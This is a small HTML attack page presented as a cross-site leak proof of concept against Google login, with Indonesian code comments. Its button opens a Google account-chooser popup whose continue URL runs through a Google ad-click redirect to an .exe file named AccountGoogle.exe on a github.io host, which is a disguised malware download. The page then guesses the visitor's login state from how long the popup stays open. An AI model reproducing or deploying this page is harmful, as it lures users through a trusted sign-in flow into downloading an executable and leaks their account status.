<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>XS-Leak PoC: Google Login Timing</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px;
      background-color: #f0f0f0;
    }
    #status {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      border: none;
      border-radius: 5px;
      background-color: #4285F4;
      color: #fff;
    }
    button:hover {
      background-color: #357ae8;
    }
  </style>
</head>
<body>

  <h1>XS-Leak PoC: Google Login Timing</h1>
  <p>Click the button to start the Google OAuth flow.</p>
  <button id="start-btn">Start Google Login Flow</button>
  <div id="status">Status: Waiting...</div>
  
  <script>
    document.getElementById('start-btn').addEventListener('click', function() {
      // URL gabungan sesuai yang lo berikan
      const googleLoginURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0";
      
      const popupWidth = 500;
      const popupHeight = 600;
      const left = (screen.width - popupWidth) / 2;
      const top = (screen.height - popupHeight) / 2;
      
      // Mulai hitung waktu saat popup dibuka
      const startTime = performance.now();
      const popup = window.open(googleLoginURL, 'GoogleLoginPopup', `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
      
      if (!popup) {
        document.getElementById('status').textContent = "Popup blocked! Please allow popups for this site.";
        return;
      }
      
      document.getElementById('status').textContent = "Popup opened. Waiting for it to close...";
      
      // Cek secara periodik apakah popup sudah ditutup
      const timer = setInterval(() => {
        try {
          if (popup.closed) {
            clearInterval(timer);
            const elapsed = performance.now() - startTime;
            document.getElementById('status').textContent = "Popup closed after " + elapsed.toFixed(2) + " ms";
            // Inferensi dasar: jika popup tertutup dengan cepat, asumsikan user sudah memilih akun dan login.
            if (elapsed < 3000) {
              alert("XS-Leak: User likely logged in (fast popup closure).");
            } else {
              alert("XS-Leak: User might not be logged in (slow popup closure).");
            }
          }
        } catch (e) {
          console.error("Error while checking popup state:", e);
        }
      }, 500);
    });
  </script>

</body>
</html>
